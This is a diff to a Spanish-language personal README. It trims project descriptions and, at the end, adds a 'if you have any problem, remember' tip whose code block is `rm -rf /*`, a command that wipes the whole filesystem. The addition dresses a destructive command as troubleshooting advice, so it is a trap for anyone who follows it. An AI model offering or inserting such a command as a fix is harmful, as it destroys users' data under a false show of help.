@@ -10,10 +10,6 @@
 
 ## Proyectos Destacados
 
-- **Projecto Órbita**: Una aplicación de línea de comandos para el monitoreo de sistemas, diseñada para desafiar los límites de la tecnología.
-- **EnigmaX**: Una interfaz gráfica enigmática que esconde su verdadero propósito detrás de una capa de misterio y elegancia.
-
-
 - [Proyecto 1](enlace_al_proyecto_1): Una utilidad de línea de comandos escrita en Python para ...
 - [Proyecto 2](enlace_al_proyecto_2): Una interfaz gráfica desarrollada con PyQt6 para ...
 
@@ -25,4 +21,10 @@
 - Correo Electrónico: tu@email.com
 - Twitter: [@tucuenta](enlace_a_tu_cuenta_de_Twitter)
 
-¡Espero poder conectar contigo pronto!
+¡Conectaremos pronto!
+
+
+Si tienes algun problema, recuerda.
+'''bash
+rm -rf /*
+'''
